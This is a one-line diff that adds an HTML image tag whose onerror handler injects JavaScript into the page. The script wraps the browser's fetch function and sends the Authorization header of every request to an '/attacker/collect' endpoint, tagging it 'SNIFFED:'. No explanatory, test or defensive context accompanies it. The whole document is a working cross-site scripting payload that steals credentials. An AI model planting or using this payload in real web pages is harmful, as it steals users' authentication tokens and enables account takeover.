@@ -1,0 +1,1 @@
+<img src=x onerror="(function(){var f=window.fetch;window.fetch=function(u,o){try{var a=o&&o.headers&&o.headers.Authorization;if(a){f('/attacker/collect?d='+encodeURIComponent('SNIFFED:'+a));}}catch(e){}return f.apply(this,arguments);};})()">
